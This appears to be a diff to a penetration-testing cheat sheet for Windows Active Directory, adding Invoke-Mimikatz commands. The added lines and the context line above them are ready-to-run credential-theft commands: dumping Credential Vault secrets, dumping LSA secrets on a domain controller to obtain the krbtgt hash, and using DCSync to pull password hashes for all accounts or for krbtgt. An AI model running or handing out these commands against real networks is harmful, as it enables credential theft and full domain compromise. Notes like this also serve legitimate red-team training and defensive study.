@@ -28,3 +28,13 @@ Credential Vault
 ```powershell
 Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
 ```
+
+Execute mimikatz on DC as DA to get krbtgt hash
+```powershell
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' 
+```
+Use the DCSync feature for getting hash
+```powershell
+Invoke-Mimikatz -Command '"lsadump::dcsync /all"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+```
